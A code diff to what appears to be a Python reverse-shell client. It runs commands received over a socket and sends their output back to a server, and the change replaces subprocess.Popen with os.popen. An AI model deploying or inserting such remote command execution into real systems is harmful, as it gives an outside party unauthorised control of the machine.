@@ -2,7 +2,6 @@
 
 import os
 import socket
-import subprocess
 
 
 class Client(object):
@@ -38,10 +37,10 @@ class Client(object):
             elif len(data) > 0:
                 try:
                     # commands from the server are run as a subprocess of the client
-                    command = subprocess.Popen(data.decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+                    process = os.popen(data.decode("utf-8"))
                     # output from the commands are returned to be displayed by the server
-                    output = str(command.stdout.read() + command.stderr.read())
-                    self.sckt.send(str.encode(output) + " ")
+                    output = str(process.read())
+                    self.sckt.send(output + " ")
                 except OSError as message:
                     self.sckt.send(str(message) + " ")
         self.sckt.close()
